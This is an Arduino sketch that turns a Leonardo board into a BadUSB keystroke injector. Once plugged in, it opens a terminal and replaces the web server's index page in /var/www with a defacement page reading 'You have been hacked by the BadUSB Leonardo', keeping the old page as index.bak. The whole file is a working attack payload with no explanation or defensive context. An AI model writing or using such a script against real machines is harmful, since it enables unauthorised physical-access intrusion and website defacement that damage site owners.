#include <phukdlib_leonardo.h>
#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarGnome("gnome-terminal");
  delay(3000);
  Keyboard.println("cd /var/www");
  delay(2000);
  Keyboard.println("mv index.* index.bak");
  delay(2000);
  Keyboard.println("touch index.html");
  delay(2000);
  Keyboard.println("nano index.html");
  delay(2000);
  Keyboard.println("<marquee><h1>You have been hacked by the BadUSB Leonardo</h1></marquee>");
  delay(2000);
  Keyboard.println("<center><a href=\"http://www.usbrubberducky.com/\"><img src=\"http://cdn.shopify.com/s/files/1/0068/2142/products/usbducky2.jpg\" /></a><center>");
  delay(2000);
  Keyboard.println("<center><h5>Your old index page can be found <a href=\"./index.bak\">here.</a></h5></center>");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('x');
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.println("y");
  delay(3000);
  Keyboard.println("exit");
  while(1);
  }
